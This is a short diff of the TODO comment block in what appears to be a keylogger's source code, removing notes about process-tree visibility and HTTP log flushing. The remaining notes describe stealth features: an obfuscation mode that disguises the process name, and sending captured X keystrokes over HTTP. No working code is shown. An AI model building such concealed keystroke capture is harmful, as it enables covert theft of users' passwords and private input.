@@ -8,15 +8,11 @@
  *
  * Known Bugs/TODOs:
  *   - fatal() doesn't yet free heap memory (logfile, hostname, etc)
- *   - although cmdline arguments are removed, the TCP port number is still
- *     shown in the process tree.
  *   - process_name in obfuscation mode shouldn't be statically defined
  *   - keys which are pressed for a longer period of time, they are not
  *     logged multiple times (this would depend on the repeat delay and
  *     speed of X keyboard settings); although this is not (yet) implemented,
  *     it won't have much impact on "regular" logs.
- *   - HTTP logging: on exit, make sure that the last remaining keystrokes
- *     in buffer are being sent before exiting. 
  *   - HTTP loggin: support POST requests
  * */
 
